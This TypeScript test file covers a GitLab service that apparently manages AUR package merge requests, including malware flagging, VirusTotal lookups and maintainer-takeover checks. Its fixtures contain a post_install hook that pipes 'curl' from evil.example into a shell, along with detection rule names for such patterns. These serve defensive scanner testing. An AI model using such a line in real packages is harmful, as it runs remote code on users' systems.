import { type MergeRequestWithDiffs, PipelineOperation } from '@chaotic-next/shared-lib';
import { sendNotification } from 'web-push';
import type { Repository } from 'typeorm';
import { describe, expect, it, vi } from 'vitest';
import { NotificationSubscription } from '../notifications/notification-subscription.entity';

vi.mock('web-push', () => ({ PushSubscription: {}, sendNotification: vi.fn() }));
import { DiffScanService } from '../diff-scan/diff-scan.service';
import { GitlabService } from './gitlab.service';
import { PipelineTrigger } from './pipeline-trigger.entity';

const ACTOR = { userId: 'test-user', userName: 'Test User' };

function createService(
  virustotal: { enabled: boolean; reportOn: ReturnType<typeof vi.fn> } = { enabled: false, reportOn: vi.fn() },
  aurScan: { maintainerStatusFor: ReturnType<typeof vi.fn> } = {
    maintainerStatusFor: vi.fn(async () => new Map()),
  },
  repoRepository?: Repository<never>,
  subscriptions: unknown[] = [],
): {
  service: GitlabService;
  pipelineTriggerRepository: {
    insert: ReturnType<typeof vi.fn>;
    update: ReturnType<typeof vi.fn>;
    findOne: ReturnType<typeof vi.fn>;
  };
  pipelinesCreate: ReturnType<typeof vi.fn>;
  mrEdit: ReturnType<typeof vi.fn>;
  noteCreate: ReturnType<typeof vi.fn>;
  discussionsCreate: ReturnType<typeof vi.fn>;
  cacheSet: ReturnType<typeof vi.fn>;
  cacheGet: ReturnType<typeof vi.fn>;
  sseNext: ReturnType<typeof vi.fn>;
  vtReportOn: ReturnType<typeof vi.fn>;
  maintainerStatusFor: ReturnType<typeof vi.fn>;
} {
  const pipelinesCreate = vi.fn();
  const pipelineTriggerRepository = { insert: vi.fn(), update: vi.fn(), findOne: vi.fn() };
  const mrEdit = vi.fn().mockResolvedValue({});
  const noteCreate = vi.fn().mockResolvedValue({});
  const discussionsCreate = vi.fn().mockResolvedValue({});
  const cacheSet = vi.fn();
  const cacheGet = vi.fn();
  const sseNext = vi.fn();

  const packageRepository = { findOne: vi.fn().mockResolvedValue({ version: '1.0', pkgrel: 1 }) };
  const defaultRepoRepository = { findOne: vi.fn().mockResolvedValue({ gitlabProjectId: 'test-project-id' }) };

  const service = new GitlabService(
    { get: cacheGet, set: cacheSet, del: vi.fn() } as never,
    { get: vi.fn(), getOrThrow: vi.fn().mockReturnValue(12345) } as never,
    new DiffScanService(),
    virustotal as never,
    aurScan as never,
    { sseEvents$: { next: sseNext } } as never,
    { find: vi.fn().mockResolvedValue(subscriptions) } as unknown as Repository<NotificationSubscription>,
    {} as Repository<never>,
    pipelineTriggerRepository as unknown as Repository<PipelineTrigger>,
    repoRepository ?? (defaultRepoRepository as unknown as Repository<never>),
    packageRepository as never,
  );
  (service as unknown as { chaoticId: string }).chaoticId = 'test-project-id';
  (service as unknown as { api: unknown }).api = {
    Pipelines: { create: pipelinesCreate },
    MergeRequests: { edit: mrEdit },
    MergeRequestNotes: { create: noteCreate },
    MergeRequestDiscussions: { create: discussionsCreate },
  };
  return {
    service,
    pipelineTriggerRepository,
    pipelinesCreate,
    mrEdit,
    noteCreate,
    discussionsCreate,
    cacheSet,
    cacheGet,
    sseNext,
    vtReportOn: virustotal.reportOn,
    maintainerStatusFor: aurScan.maintainerStatusFor,
  };
}

describe('GitlabService.operations', () => {
  it('creates bump commit via Commits.create for operation Bump Packages', async () => {
    const { service, pipelineTriggerRepository } = createService();
    const createCommit = vi.fn().mockResolvedValue({ id: 'bump123', web_url: 'https://gitlab.com/commit/bump123' });
    const showRaw = vi.fn().mockResolvedValue('CI_PACKAGE_BUMP=1.0-1/1\n');
    (service as unknown as { api: unknown }).api = {
      Commits: { create: createCommit },
      RepositoryFiles: { showRaw },
    };

    const result = await service.bumpPackages(['nodejs'], 'chaotic-aur', 'main', ACTOR);

    expect(showRaw).toHaveBeenCalledWith('test-project-id', 'nodejs/.CI/config', 'main');
    expect(createCommit).toHaveBeenCalledWith(
      'test-project-id',
      'main',
      'chore(bump): nodejs\n\nBumped manually by Test User',
      [
        {
          action: 'update',
          filePath: 'nodejs/.CI/config',
          content: 'CI_PACKAGE_BUMP=1.0-1/2\n',
        },
      ],
    );
    expect(result).toEqual({
      pipelineId: 0,
      webUrl: 'https://gitlab.com/commit/bump123',
      status: 'committed',
    });
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith({
      ref: 'main',
      commitSha: 'bump123',
      operation: PipelineOperation.BUMP_PACKAGES,
      inputs: { packages: 'nodejs' },
      pipelineId: null,
      webUrl: 'https://gitlab.com/commit/bump123',
      ...ACTOR,
    });
  });

  it('throws NotFoundException when bumping non-existent package', async () => {
    const packageRepository = { findOne: vi.fn().mockResolvedValue(null) };
    const repoRepository = { findOne: vi.fn().mockResolvedValue({ gitlabProjectId: 'test-project-id' }) };
    const service = new GitlabService(
      { get: vi.fn(), set: vi.fn(), del: vi.fn() } as never,
      { get: vi.fn(), getOrThrow: vi.fn().mockReturnValue(12345) } as never,
      new DiffScanService(),
      { enabled: false, reportOn: vi.fn() } as never,
      { maintainerStatusFor: vi.fn(async () => new Map()) } as never,
      { sseEvents$: { next: vi.fn() } } as never,
      {} as Repository<never>,
      {} as Repository<never>,
      { insert: vi.fn(), update: vi.fn(), findOne: vi.fn() } as unknown as Repository<PipelineTrigger>,
      repoRepository as unknown as Repository<never>,
      packageRepository as never,
    );
    (service as unknown as { chaoticId: string }).chaoticId = 'test-project-id';

    await expect(service.bumpPackages(['nonexistent'], 'chaotic-aur', 'main', ACTOR)).rejects.toThrow(
      "Package 'nonexistent' not found",
    );
  });

  it('deletes package directories via Commits.create for operation Drop Packages', async () => {
    const { service, pipelineTriggerRepository } = createService();
    const createCommit = vi.fn().mockResolvedValue({ id: 'commit123', web_url: 'https://gitlab.com/commit/123' });
    const allRepositoryTrees = vi.fn().mockImplementation((projectId, options: { path: string }) =>
      Promise.resolve([
        { type: 'blob', path: `${options.path}/.CI/config` },
        { type: 'blob', path: `${options.path}/PKGBUILD` },
      ]),
    );
    (service as unknown as { api: unknown }).api = {
      Commits: { create: createCommit },
      Repositories: { allRepositoryTrees },
    };

    const result = await service.dropPackages(['paru', 'zen-browser'], 'chaotic-aur', 'main', ACTOR);

    expect(createCommit).toHaveBeenCalledWith(
      'test-project-id',
      'main',
      'chore(drop): paru, zen-browser\n\nDropped manually by Test User',
      [
        { action: 'delete', filePath: 'paru/.CI/config' },
        { action: 'delete', filePath: 'paru/PKGBUILD' },
        { action: 'delete', filePath: 'zen-browser/.CI/config' },
        { action: 'delete', filePath: 'zen-browser/PKGBUILD' },
      ],
    );
    expect(result).toEqual({
      pipelineId: 0,
      webUrl: 'https://gitlab.com/commit/123',
      status: 'committed',
    });
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith({
      ref: 'main',
      commitSha: 'commit123',
      operation: PipelineOperation.DROP_PACKAGES,
      inputs: { packages: 'paru:zen-browser' },
      pipelineId: null,
      webUrl: 'https://gitlab.com/commit/123',
      ...ACTOR,
    });
  });

  it('adds new package files via Commits.create for operation Add Packages', async () => {
    const { service, pipelineTriggerRepository } = createService();
    const createCommit = vi.fn().mockResolvedValue({ id: 'commit456', web_url: 'https://gitlab.com/commit/456' });
    (service as unknown as { api: unknown }).api = {
      Commits: { create: createCommit },
    };
    (service as unknown as { aurScanService: unknown }).aurScanService = {
      startScan: vi.fn().mockResolvedValue({ packageBase: 'paru' }),
    };

    const result = await service.addPackages(
      [{ pkgname: 'paru', source: 'aur' }],
      'chaotic-aur',
      'github/5678',
      'main',
      ACTOR,
    );

    expect(createCommit).toHaveBeenCalled();
    expect(result.status).toBe('committed');
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith({
      ref: 'main',
      commitSha: 'commit456',
      operation: PipelineOperation.ADD_PACKAGES,
      inputs: { add_packages: 'paru', request_origin: 'github/5678' },
      pipelineId: null,
      webUrl: 'https://gitlab.com/commit/456',
      ...ACTOR,
    });
  });

  it('does not record an audit row when the GitLab call fails', async () => {
    const { service, pipelinesCreate, pipelineTriggerRepository } = createService();
    pipelinesCreate.mockRejectedValue(new Error('GitLab unavailable'));

    await expect(service.triggerPipelineRun({ operation: 'None' }, 'main', ACTOR)).rejects.toThrow(
      'GitLab unavailable',
    );
    expect(pipelineTriggerRepository.insert).not.toHaveBeenCalled();
  });
});

function mr(overrides: Partial<MergeRequestWithDiffs>): MergeRequestWithDiffs {
  return {
    id: 1,
    iid: 1,
    title: 'chore(update): testpkg',
    state: 'opened',
    web_url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/1',
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    assignees: [],
    sha: 'abc123',
    merge_status: 'can_be_merged',
    detailed_merge_status: 'not_approved',
    labels: ['human-review'],
    diffs: [],
    ...overrides,
  };
}

describe('GitlabService.autoFlagMergeRequests', () => {
  const criticalFinding = {
    ruleId: 'NPM-001',
    ruleName: 'Package manager fetch at build/install time',
    severity: 'critical',
    description: 'desc',
    file: 'testpkg/testpkg.install',
    line: 3,
    match: 'npm install atomic-lockfile',
  } as const;

  it('adds the malware label, anchors findings as line comments and posts a summary note', async () => {
    const { service, mrEdit, noteCreate, discussionsCreate, cacheSet, sseNext } = createService();
    const flagged = mr({
      diff_refs: { base_sha: 'base', head_sha: 'head', start_sha: 'start' },
      scanFindings: [criticalFinding],
    });

    await service.autoFlagMergeRequests([flagged, mr({ title: 'chore(update): cleanpkg' })]);

    expect(mrEdit).toHaveBeenCalledTimes(1);
    expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'malware' });
    expect(discussionsCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('NPM-001'), {
      position: {
        positionType: 'text',
        baseSha: 'base',
        startSha: 'start',
        headSha: 'head',
        oldPath: 'testpkg/testpkg.install',
        newPath: 'testpkg/testpkg.install',
        newLine: '3',
      },
    });
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('malware'));
    expect(flagged.labels).toContain('malware');
    expect(cacheSet).toHaveBeenCalledTimes(1);
    expect(sseNext).toHaveBeenCalledTimes(1);
  });

  it('keeps findings in the summary note when the MR has no diff refs', async () => {
    const { service, noteCreate, discussionsCreate } = createService();

    await service.autoFlagMergeRequests([mr({ diff_refs: null, scanFindings: [criticalFinding] })]);

    expect(discussionsCreate).not.toHaveBeenCalled();
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('NPM-001'));
  });

  it('skips MRs that already carry the verdict label or a stronger one', async () => {
    const { service, mrEdit } = createService();
    const warning = {
      ruleId: 'OBF-001',
      ruleName: 'Base64 decoding',
      severity: 'warning',
      description: 'desc',
      file: 'testpkg/PKGBUILD',
      match: 'base64 -d',
    } as const;

    await service.autoFlagMergeRequests([
      mr({ labels: ['human-review', 'suspicious'], scanFindings: [warning, warning] }),
      mr({ labels: ['human-review', 'malware'], scanFindings: [warning, warning] }),
    ]);

    expect(mrEdit).not.toHaveBeenCalled();
  });

  it('leaves MRs without notable findings alone', async () => {
    const { service, mrEdit, cacheSet } = createService();
    const info = {
      ruleId: 'NET-001',
      ruleName: 'Unencrypted HTTP URL',
      severity: 'info',
      description: 'desc',
      file: 'testpkg/PKGBUILD',
      match: 'http://',
    } as const;

    await service.autoFlagMergeRequests([mr({ scanFindings: [info] })]);

    expect(mrEdit).not.toHaveBeenCalled();
    expect(cacheSet).not.toHaveBeenCalled();
  });
});

describe('GitlabService.enrichVirusTotalReports', () => {
  const criticalFinding = {
    ruleId: 'DLE-001',
    ruleName: 'Curl piped into a shell',
    severity: 'critical',
    description: 'desc',
    file: 'testpkg/testpkg.install',
    line: 2,
    match: 'curl -s https://evil.example/payload | sh',
  } as const;

  const flaggedMr = (): MergeRequestWithDiffs =>
    mr({
      diffs: [
        {
          old_path: 'testpkg/testpkg.install',
          new_path: 'testpkg/testpkg.install',
          a_mode: '100644',
          b_mode: '100644',
          new_file: true,
          renamed_file: false,
          deleted_file: false,
          diff: ['@@ -0,0 +1,2 @@', '+post_install() {', '+  curl -s https://evil.example/payload | sh'].join('\n'),
        },
      ],
      scanFindings: [criticalFinding],
    });

  const maliciousReport = {
    type: 'url',
    value: 'https://evil.example/payload',
    context: 'testpkg/testpkg.install:2',
    verdict: 'malicious',
    stats: { malicious: 5, suspicious: 1, undetected: 40, harmless: 20, timeout: 0 },
  } as const;

  const enrich = (service: GitlabService, mrs: MergeRequestWithDiffs[]): Promise<void> =>
    (
      service as unknown as {
        enrichVirusTotalReports: (mrs: MergeRequestWithDiffs[]) => Promise<void>;
      }
    ).enrichVirusTotalReports(mrs);

  it('attaches reports, refreshes the cache and posts a note for notable verdicts', async () => {
    const reportOn = vi.fn().mockResolvedValue([maliciousReport]);
    const { service, noteCreate, cacheSet, sseNext } = createService({ enabled: true, reportOn });
    const flagged = flaggedMr();

    await enrich(service, [flagged]);

    expect(reportOn).toHaveBeenCalledTimes(1);
    expect(reportOn.mock.calls[0]?.[0]).toEqual([
      { type: 'url', value: 'https://evil.example/payload', context: 'testpkg/testpkg.install:2' },
    ]);
    expect(flagged.vtReports).toEqual([maliciousReport]);
    expect(cacheSet).toHaveBeenCalledTimes(1);
    expect(sseNext).toHaveBeenCalledTimes(1);
    expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, expect.stringContaining('VirusTotal'));
  });

  it('posts only one note per MR across repeated cron cycles', async () => {
    const reportOn = vi.fn().mockResolvedValue([maliciousReport]);
    const { service, noteCreate } = createService({ enabled: true, reportOn });
    const flagged = flaggedMr();

    await enrich(service, [flagged]);
    flagged.vtReports = undefined;
    await enrich(service, [flagged]);

    expect(noteCreate).toHaveBeenCalledTimes(1);
  });

  it('skips MRs without scan findings and stays inert when no API key is configured', async () => {
    const enabled = createService({ enabled: true, reportOn: vi.fn() });
    const disabled = createService();

    await enrich(enabled.service, [mr({ title: 'chore(update): cleanpkg' })]);
    await enrich(disabled.service, [flaggedMr()]);

    expect(enabled.vtReportOn).not.toHaveBeenCalled();
    expect(disabled.vtReportOn).not.toHaveBeenCalled();
    expect(enabled.cacheSet).not.toHaveBeenCalled();
  });
});

describe('GitlabService.getOpenMergeRequests', () => {
  const mrSchema = (iid: number): Record<string, unknown> => ({
    id: iid,
    iid,
    title: `chore(update): pkg${iid}`,
    state: 'opened',
    web_url: `https://gitlab.com/chaotic-aur/pkgbuilds/-/merge_requests/${iid}`,
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    assignees: [],
    sha: 'abc123',
    labels: [],
    merge_status: 'can_be_merged',
    detailed_merge_status: 'not_approved',
    diff_refs: null,
  });

  const diffEntry = {
    old_path: 'pkg/PKGBUILD',
    new_path: 'pkg/PKGBUILD',
    a_mode: '100644',
    b_mode: '100644',
    new_file: false,
    renamed_file: false,
    deleted_file: false,
    diff: '@@ -1,2 +1,2 @@\n pkgver=1.0\n pkgrel=2',
  };

  it('fetches diffs in bounded batches and keeps going when one MR diff fails', async () => {
    const { service, cacheSet } = createService();
    const all = vi.fn().mockResolvedValue([mrSchema(1), mrSchema(2)]);
    const allDiffs = vi
      .fn()
      .mockImplementation((projectId: string, iid: number) =>
        iid === 2 ? Promise.reject(new Error('500 Internal Server Error')) : Promise.resolve([diffEntry]),
      );
    (service as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };

    const data = await service.getOpenMergeRequests(true);

    expect(allDiffs).toHaveBeenCalledTimes(2);
    expect(data[0]?.diffs).toEqual([diffEntry]);
    expect(data[0]?.scanFindings).toEqual([]);
    expect(data[1]?.diffs).toEqual([]);
    expect(data[1]?.scanFindings).toEqual([]);
    expect(cacheSet).toHaveBeenCalledTimes(1);
  });

  it('serves cached MRs without touching the GitLab API', async () => {
    const { service, cacheSet } = createService();
    const cached: MergeRequestWithDiffs[] = [mr({ title: 'chore(update): cachedpkg' })];
    (service as unknown as { cacheManager: unknown }).cacheManager = {
      get: vi.fn().mockResolvedValue(cached),
      set: cacheSet,
      del: vi.fn(),
    };
    const all = vi.fn();
    (service as unknown as { api: unknown }).api = { MergeRequests: { all } };

    const data = await service.getOpenMergeRequests(false);

    expect(data).toBe(cached);
    expect(all).not.toHaveBeenCalled();
    expect(cacheSet).not.toHaveBeenCalled();
  });

  it('reuses cached diffs and scan findings for MRs whose revision did not move', async () => {
    const { service, cacheSet } = createService();
    const firstMr = mrSchema(1);
    const secondMr = mrSchema(2);
    const all = vi
      .fn()
      .mockResolvedValueOnce([firstMr, secondMr])
      .mockResolvedValueOnce([firstMr, { ...secondMr, updated_at: '2026-01-02T00:00:00Z' }]);
    const allDiffs = vi.fn().mockResolvedValue([diffEntry]);
    (service as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };

    const first = await service.getOpenMergeRequests(true);
    const second = await service.getOpenMergeRequests(true);

    expect(allDiffs).toHaveBeenCalledTimes(3);
    expect(allDiffs).toHaveBeenNthCalledWith(1, 'test-project-id', 1);
    expect(allDiffs).toHaveBeenNthCalledWith(2, 'test-project-id', 2);
    expect(allDiffs).toHaveBeenNthCalledWith(3, 'test-project-id', 2);

    expect(second[0]?.diffs).toBe(first[0]?.diffs);
    expect(second[0]?.scanFindings).toBe(first[0]?.scanFindings);
    expect(second[1]?.scanFindings).not.toBe(first[1]?.scanFindings);
    expect(cacheSet).toHaveBeenCalledTimes(2);
  });

  it('carries VirusTotal reports and maintainer info over to a rebuilt snapshot', async () => {
    const { service, cacheSet } = createService();
    const all = vi.fn().mockResolvedValue([mrSchema(1)]);
    const allDiffs = vi.fn().mockResolvedValue([diffEntry]);
    (service as unknown as { api: unknown }).api = { MergeRequests: { all, allDiffs } };
    const previous: MergeRequestWithDiffs[] = [
      mr({
        vtReports: [
          {
            type: 'url',
            value: 'https://evil.example/payload',
            context: 'testpkg/testpkg.install:2',
            verdict: 'malicious',
          },
        ],
        maintainers: [
          { username: 'stranger', packagesMaintained: 1, totalVotes: 0, oldestFirstSubmitted: '', novice: true },
        ],
      }),
    ];
    (service as unknown as { cacheManager: unknown }).cacheManager = {
      get: vi.fn().mockResolvedValue(previous),
      set: cacheSet,
      del: vi.fn(),
    };

    const data = await service.getOpenMergeRequests(true);

    expect(data[0]?.vtReports).toEqual(previous[0]?.vtReports);
    expect(data[0]?.maintainers).toEqual(previous[0]?.maintainers);
  });
});

describe('GitlabService.approveMergeRequest', () => {
  it('approves MR on GitLab but defers merge execution while scheduled pipeline is running', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review'] });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    (service as unknown as { api: unknown }).api = {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    };
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    vi.useFakeTimers();

    // 03:35 UTC - inside scheduled pipeline window
    vi.setSystemTime(new Date('2026-08-21T03:35:00Z'));
    try {
      const result = await service.approveMergeRequest(1, 'abc123', ACTOR);
      expect(result).toEqual({ deferred: true });
      expect(approvalsApprove).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
      expect(mrAccept).not.toHaveBeenCalled();
      expect(mrActionInsert).toHaveBeenCalled();
    } finally {
      vi.useRealTimers();
    }
  });

  it('refuses to approve MRs the scan flagged as malware', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review', 'malware'] });
    const approvalsApprove = vi.fn().mockResolvedValue({});
    (service as unknown as { api: unknown }).api = {
      MergeRequests: { show, edit: vi.fn() },
      MergeRequestApprovals: { approve: approvalsApprove },
    };

    await expect(service.approveMergeRequest(1, 'abc123', ACTOR)).rejects.toThrow('malware');
    expect(approvalsApprove).not.toHaveBeenCalled();
  });

  it('approves regular MRs, posts comment, records action, and merges', async () => {
    const { service } = createService();
    const show = vi.fn().mockResolvedValue({ iid: 1, sha: 'abc123', labels: ['human-review'] });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    (service as unknown as { api: unknown }).api = {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    };
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    vi.useFakeTimers();
    // 03:00 UTC - outside scheduled pipeline window
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
    try {
      await service.approveMergeRequest(1, 'abc123', ACTOR);

      expect(approvalsApprove).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
      expect(mrEdit).toHaveBeenCalledWith('test-project-id', 1, { addLabels: 'approved' });
      expect(noteCreate).toHaveBeenCalledWith('test-project-id', 1, '**✅ Approved by** Test User.');
      expect(mrActionInsert).toHaveBeenCalledWith({
        mergeRequestIid: 1,
        action: 'approve',
        commitSha: 'abc123',
        ...ACTOR,
      });
      expect(mrAccept).toHaveBeenCalledWith('test-project-id', 1, { sha: 'abc123' });
    } finally {
      vi.useRealTimers();
    }
  });

  it('rebases and retries merge if initial accept fails', async () => {
    const { service } = createService();
    const show = vi
      .fn()
      .mockResolvedValueOnce({ iid: 1, sha: 'abc123', labels: ['human-review'] })
      .mockResolvedValueOnce({ iid: 1, sha: 'def456', labels: ['human-review', 'approved'] });
    const mrEdit = vi.fn().mockResolvedValue({});
    const mrAccept = vi.fn().mockRejectedValueOnce(new Error('Branch cannot be merged')).mockResolvedValueOnce({});
    const mrRebase = vi.fn().mockResolvedValue({});
    const approvalsApprove = vi.fn().mockResolvedValue({});
    const noteCreate = vi.fn().mockResolvedValue({});
    const mrActionInsert = vi.fn();
    (service as unknown as { api: unknown }).api = {
      MergeRequests: { show, edit: mrEdit, accept: mrAccept, rebase: mrRebase },
      MergeRequestApprovals: { approve: approvalsApprove },
      MergeRequestNotes: { create: noteCreate },
    };
    (service as unknown as { mrActionRepository: unknown }).mrActionRepository = { insert: mrActionInsert };

    vi.useFakeTimers();
    // 03:00 UTC - outside scheduled pipeline window
    vi.setSystemTime(new Date('2026-08-21T03:00:00Z'));
    try {
      await service.approveMergeRequest(1, 'abc123', ACTOR);

      expect(mrRebase).toHaveBeenCalledWith('test-project-id', 1);
      expect(mrAccept).toHaveBeenNthCalledWith(1, 'test-project-id', 1, { sha: 'abc123' });
      expect(mrAccept).toHaveBeenNthCalledWith(2, 'test-project-id', 1, { sha: 'def456' });
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('GitlabService.enrichMaintainerInfo', () => {
  const strangerStatus = {
    maintainers: [
      {
        username: 'stranger',
        packagesMaintained: 1,
        totalVotes: 0,
        oldestFirstSubmitted: new Date().toISOString(),
        novice: true,
      },
    ],
    meta: { votes: 3, popularity: 0.5, firstSubmitted: '', outOfDate: false, orphaned: false },
    change: {
      previous: ['oldmaintainer'],
      added: ['stranger'],
      removed: ['oldmaintainer'],
      detectedAt: new Date().toISOString(),
    },
  };

  function enrich(service: GitlabService) {
    return (service as unknown as { enrichMaintainerInfo(mrs: MergeRequestWithDiffs[]): Promise<void> })
      .enrichMaintainerInfo;
  }

  it('attaches maintainers and takeover changes to update MRs', async () => {
    const maintainerStatusFor = vi.fn(async () => new Map([['evilpkg', strangerStatus]]));
    const { service, cacheSet, sseNext } = createService(undefined, { maintainerStatusFor });
    const updateMr = mr({ title: 'chore(update): evilpkg' });
    const otherMr = mr({ title: 'chore: mass rebuild', iid: 2, id: 99 });

    await enrich(service).call(service, [updateMr, otherMr]);

    expect(maintainerStatusFor).toHaveBeenCalledTimes(1);
    expect(maintainerStatusFor).toHaveBeenCalledWith(['evilpkg']);
    expect(updateMr.maintainers?.[0]?.username).toBe('stranger');
    expect(updateMr.maintainerChange?.added).toEqual(['stranger']);
    expect(otherMr.maintainers).toBeUndefined();
    expect(cacheSet).toHaveBeenCalled();
    expect(sseNext).toHaveBeenCalled();
  });

  it('skips MRs whose updated_at has not changed since the last run', async () => {
    const maintainerStatusFor = vi.fn(async () => new Map([['evilpkg', strangerStatus]]));
    const { service } = createService(undefined, { maintainerStatusFor });
    const updateMr = mr({ title: 'chore(update): evilpkg', updated_at: '2026-08-16T10:00:00Z' });

    await enrich(service).call(service, [updateMr]);
    await enrich(service).call(service, [{ ...updateMr, maintainers: undefined, maintainerChange: undefined }]);
    expect(maintainerStatusFor).toHaveBeenCalledTimes(1);

    const pushedMr = {
      ...updateMr,
      updated_at: '2026-08-16T12:00:00Z',
      maintainers: undefined,
      maintainerChange: undefined,
    };
    await enrich(service).call(service, [pushedMr]);
    expect(maintainerStatusFor).toHaveBeenCalledTimes(2);
    expect(maintainerStatusFor).toHaveBeenLastCalledWith(['evilpkg']);
  });
});

describe('handlePipelineWebhook', () => {
  it('backfills pipeline ID matching commitSha when tracked in unlinkedCommitShas set', async () => {
    const { service, pipelineTriggerRepository } = createService();
    pipelineTriggerRepository.update.mockResolvedValue({ affected: 1 });
    (service as unknown as { unlinkedCommitShas: Set<string> }).unlinkedCommitShas.add('abc123456');

    const webhookPayload = {
      object_kind: 'pipeline' as const,
      object_attributes: {
        id: 9999,
        iid: 12,
        ref: 'main',
        status: 'running',
        source: 'push',
        sha: 'abc123456',
        created_at: '2026-08-21T19:00:00Z',
        url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/9999',
      },
    } as unknown as import('./interfaces').PipelineWebhook;

    await service.handlePipelineWebhook(webhookPayload);

    expect(pipelineTriggerRepository.update).toHaveBeenCalledWith(
      { commitSha: 'abc123456', pipelineId: expect.anything() },
      { pipelineId: 9999 },
    );
    expect((service as unknown as { unlinkedCommitShas: Set<string> }).unlinkedCommitShas.has('abc123456')).toBe(false);
  });

  it('skips commitSha backfill when SHA is not in unlinkedCommitShas set', async () => {
    const { service, pipelineTriggerRepository } = createService();
    pipelineTriggerRepository.findOne.mockResolvedValue(null);

    const webhookPayload = {
      object_kind: 'pipeline' as const,
      object_attributes: {
        id: 8888,
        iid: 14,
        ref: 'main',
        status: 'running',
        source: 'push',
        sha: 'untracked123',
        created_at: '2026-08-21T19:00:00Z',
        url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/8888',
      },
    } as unknown as import('./interfaces').PipelineWebhook;

    await service.handlePipelineWebhook(webhookPayload);

    expect(pipelineTriggerRepository.update).not.toHaveBeenCalled();
    expect(pipelineTriggerRepository.findOne).toHaveBeenCalledWith({
      where: { pipelineId: 8888, commitSha: expect.anything() },
    });
  });

  it('backfills commitSha on trigger with matching pipelineId via reverse webhook lookup', async () => {
    const { service, pipelineTriggerRepository } = createService();
    pipelineTriggerRepository.findOne.mockResolvedValue({ id: 42, pipelineId: 7777, commitSha: null });
    pipelineTriggerRepository.update.mockResolvedValue({ affected: 1 });

    const webhookPayload = {
      object_kind: 'pipeline' as const,
      object_attributes: {
        id: 7777,
        iid: 20,
        ref: 'main',
        status: 'running',
        source: 'schedule',
        sha: 'deadbeef123',
        created_at: '2026-08-21T19:00:00Z',
        url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/7777',
      },
    } as unknown as import('./interfaces').PipelineWebhook;

    await service.handlePipelineWebhook(webhookPayload);

    expect(pipelineTriggerRepository.findOne).toHaveBeenCalledWith({
      where: { pipelineId: 7777, commitSha: expect.anything() },
    });
    expect(pipelineTriggerRepository.update).toHaveBeenCalledWith(42, { commitSha: 'deadbeef123' });
  });

  it('does not backfill commitSha when trigger already has one', async () => {
    const { service, pipelineTriggerRepository } = createService();
    pipelineTriggerRepository.findOne.mockResolvedValue(null);

    const webhookPayload = {
      object_kind: 'pipeline' as const,
      object_attributes: {
        id: 7777,
        iid: 20,
        ref: 'main',
        status: 'running',
        source: 'schedule',
        sha: 'deadbeef123',
        created_at: '2026-08-21T19:00:00Z',
        url: 'https://gitlab.com/chaotic-aur/pkgbuilds/-/pipelines/7777',
      },
    } as unknown as import('./interfaces').PipelineWebhook;

    await service.handlePipelineWebhook(webhookPayload);

    expect(pipelineTriggerRepository.findOne).toHaveBeenCalledWith({
      where: { pipelineId: 7777, commitSha: expect.anything() },
    });
    expect(pipelineTriggerRepository.update).not.toHaveBeenCalled();
  });
});

describe('GitlabService.runSchedule', () => {
  it('captures pipeline ID and commit SHA from play API response', async () => {
    const { service, pipelineTriggerRepository } = createService();
    const playResult = {
      data: {
        last_pipeline: { id: 5555, sha: 'abc123sha', ref: 'main', status: 'created' },
      },
    };
    const schedulesPlay = vi.fn().mockResolvedValue(playResult);
    (service as unknown as { api: unknown }).api = {
      PipelineSchedules: { play: schedulesPlay },
    };

    const result = await service.runSchedule(15, ACTOR);

    expect(schedulesPlay).toHaveBeenCalledWith('test-project-id', 15);
    expect(result.pipelineId).toBe(5555);
    expect(result.status).toBe('scheduled');
    expect(pipelineTriggerRepository.insert).toHaveBeenCalledWith(
      expect.objectContaining({
        ref: 'main',
        commitSha: 'abc123sha',
        operation: PipelineOperation.RUN_SCHEDULE,
        inputs: { scheduleId: '15' },
        pipelineId: 5555,
      }),
    );
    expect((service as unknown as { unlinkedCommitShas: Set<string> }).unlinkedCommitShas.has('abc123sha')).toBe(true);
  });

  it('falls back to schedule endpoint URL when play response has no last_pipeline', async () => {
    const { service, pipelineTriggerRepository } = createService();
    const schedulesPlay = vi.fn().mockResolvedValue({ data: {} });
    (service as unknown as { api: unknown }).api = {
      PipelineSchedules: { play: schedulesPlay },
    };

    const result = await service.runSchedule(15, ACTOR);

